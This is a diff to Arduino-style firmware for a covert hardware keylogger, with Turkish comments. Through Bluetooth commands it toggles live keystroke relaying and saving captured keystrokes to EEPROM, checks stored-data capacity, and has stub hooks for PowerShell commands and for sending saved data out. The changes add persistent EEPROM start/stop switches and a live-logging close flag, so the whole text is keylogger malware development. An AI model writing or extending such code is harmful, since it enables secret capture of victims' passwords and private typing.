@@ -117,6 +117,7 @@ boolean combinePress = 0;
 //eeprom
 byte adressEnd;
 int _adressEnd;
+boolean is_EEPROM_open; // 0 -> kapali // 1 -> acik
 
 class KbdRptParser : public KeyboardReportParser
 {
@@ -430,6 +431,8 @@ void setup()
 
   unsigned int address = 0;
 
+  is_EEPROM_open = readEEPROM(disk1, 0);
+
   pinMode(4, INPUT_PULLUP);
 
 #if !defined(__MIPSEL__)
@@ -486,6 +489,7 @@ void bluetoothData() {
       blueKeyboard = 0;
       blueMouse = 0;
       blueKeylogger = 0; //live
+      blueKeyIn = 0; //liveClose
       printed = "";  
       }
     
@@ -509,7 +513,9 @@ void bluetoothCommit()
 
     if (printed == "MOUSEOPEN") { blueMouse = 1; } // bluetooth ile fare kontrol etmek icin gerekli kodlar.
 
-    if (printed == "LIVEKEYLOGGEROPEN") { blueKeylogger = 1; } // bluetooth keylogger ozelligi icin gerekli kodlar.
+    if (printed == "LIVEKEYLOGGEROPEN") { blueKeyIn = 0; blueKeylogger = 1; } // bluetooth keylogger ozelligi icin gerekli kodlar.
+
+    if (printed == "LIVEKEYLOGGEROPENCLOSEEEPROM") {} // bluetooth keylogger ozelligi, eeprom kaydediyorsa eger duracak
 
     if (printed == "POWERSHELLOPEN") {} // bluetooth poweshell komutlarini kullanabilmek icin gerekli kodlar
 
@@ -517,9 +523,11 @@ void bluetoothCommit()
                                     
     if (printed == "EEPROMDATACHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }
 
-    if (printed == "EEPROMSTART") {} // eeprom ozelligini acmak icin gerekli kelime
+    if (printed == "EEPROMSTART") { writeEEPROM(disk1, 0, 1); is_EEPROM_open = 1; } // eeprom ozelligini acmak icin gerekli kelime
 
-    if (printed == "GETEEPROMDATA") {} // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime //EEPROMISFINISH == tum datayi attiktan sonra gonderilecek kelime
+    if (printed == "EEPROMSTOP") { writeEEPROM(disk1, 0, 0); is_EEPROM_open = 0; } // eeprom ozelligini kapamak icin gerekli kelime
+
+    if (printed == "GETEEPROMDATA") {} // eeprom icinde kayitli datayi bluetooth ustunden gondermek icin bekleyen kelime 
  }
 
   blueCommit = 0;
